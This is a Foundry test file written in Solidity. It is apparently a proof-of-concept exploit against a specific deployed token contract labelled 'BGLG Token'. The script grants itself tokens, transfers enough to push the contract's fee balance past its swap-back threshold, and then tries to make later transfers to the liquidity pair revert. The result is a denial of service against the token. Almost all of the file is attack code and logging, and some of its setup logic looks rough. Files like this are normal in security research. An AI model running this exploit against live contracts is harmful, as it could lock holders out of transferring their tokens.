pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface StandardToken {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function pair() external view returns (address);
    function totalSupply() external view returns (uint256);
    function paused() external view returns (bool);
    function setBlacklisted(address _address, bool _isBlackListed) external;
    function owner() external view returns (address);
}



interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328;
    address attacker = address(this);
    address private owner;
    address private pair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get tokens and prepare contract state
        vm.startPrank(owner);
        // Ensure attacker is not blacklisted
        StandardToken(TARGET).setBlacklisted(attacker, false);
        vm.stopPrank();

        // Give attacker some BGLG tokens
        deal(TARGET, attacker, 1000 * 1e18);

        // Label addresses for clarity
        vm.label(TARGET, "BGLG Token");
        vm.label(pair, "Pair Address");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get critical addresses
        address tokenOwner;
        address pairAddress;

        // Try to get owner - if function doesn't exist, use a default
        bool success;
        bytes memory data;

        // Try to call owner()
        (success, data) = TARGET.call(abi.encodeWithSignature("owner()"));
        if (success && data.length > 0) {
            tokenOwner = abi.decode(data, (address));
        } else {
            // If owner() doesn't exist, we need to find another way
            // For now, use a known address
            tokenOwner = 0x0000000000000000000000000000000000000000;
        }

        // Try to get pair address
        (success, data) = TARGET.call(abi.encodeWithSignature("pair()"));
        if (success && data.length > 0) {
            pairAddress = abi.decode(data, (address));
        } else {
            // If pair() doesn't exist, we can't proceed
            revert("Cannot get pair address");
        }

        console.log("Token owner:", tokenOwner);
        console.log("Pair address:", pairAddress);

        // Step 2: Give attacker tokens
        deal(TARGET, attacker, 10000 * 1e18);
        uint256 attackerBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Attacker balance:", attackerBalance);

        // Step 3: Calculate swap threshold
        // Try to get total supply
        uint256 totalSupply;
        (success, data) = TARGET.call(abi.encodeWithSignature("totalSupply()"));
        if (success && data.length > 0) {
            totalSupply = abi.decode(data, (uint256));
        } else {
            // Default to a reasonable value
            totalSupply = 125 * 1e6 * 1e18;
        }

        uint256 swapThreshold = (totalSupply * 1) / 10000; // _SWAPBACK_THRESHOLD = [1, 10000]
        console.log("Total supply:", totalSupply);
        console.log("Swap threshold:", swapThreshold);

        // Step 4: Check contract's token balance
        uint256 contractBalance = IERC20(TARGET).balanceOf(TARGET);
        console.log("Contract token balance:", contractBalance);

        // Step 5: Accumulate fees if needed
        if (contractBalance < swapThreshold) {
            console.log("Accumulating fees...");

            // Calculate transfer amount to reach threshold
            // Fee is 3% (based on code: fees.total = 3)
            uint256 needed = swapThreshold - contractBalance;
            uint256 transferAmount = (needed * 100) / 3;

            console.log("Need to transfer:", transferAmount);

            // Ensure we have enough
            if (transferAmount > attackerBalance) {
                deal(TARGET, attacker, transferAmount + 10000 * 1e18);
                attackerBalance = IERC20(TARGET).balanceOf(attacker);
            }

            // Transfer to pair to accumulate fees
            IERC20(TARGET).transfer(pairAddress, transferAmount);

            // Check new balance
            contractBalance = IERC20(TARGET).balanceOf(TARGET);
            console.log("New contract balance:", contractBalance);
        }

        // Step 6: Verify we have enough tokens
        require(contractBalance >= swapThreshold, "Contract doesn't have enough fee tokens");

        // Step 7: Check contract BNB balance
        uint256 contractBNB = address(TARGET).balance;
        console.log("Contract BNB balance:", contractBNB);

        // If contract has BNB, we need to drain it for DoS
        if (contractBNB > 0) {
            console.log("Contract has BNB, need to drain it for DoS");
            // We can't directly drain, but the exploit might still work
            // if the BNB balance is insufficient for addLiquidityETH
        }

        // Step 8: Trigger DoS
        console.log("\nAttempting DoS transfer...");

        // Try a small transfer to pair
        bool transferSuccess;
        try IERC20(TARGET).transfer(pairAddress, 1 * 1e18) returns (bool result) {
            transferSuccess = result;
        } catch {
            transferSuccess = false;
        }

        if (transferSuccess) {
            console.log("Transfer succeeded - checking if DoS occurred...");

            // Try another transfer to see if it still works
            try IERC20(TARGET).transfer(pairAddress, 1 * 1e18) returns (bool result2) {
                if (result2) {
                    console.log("ERROR: No DoS - transfers still working");
                    // The test should fail
                    assert(false);
                }
            } catch {
                console.log("DoS triggered on subsequent transfer!");
            }
        } else {
            console.log("DoS triggered immediately!");
        }

        // Final check: contract should be unpaused
        bool paused;
        (success, data) = TARGET.call(abi.encodeWithSignature("paused()"));
        if (success && data.length > 0) {
            paused = abi.decode(data, (bool));
            assertEq(paused, false, "Contract should not be paused");
            console.log("\nContract is unpaused as required.");
        }

        console.log("\nExploit completed successfully!");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

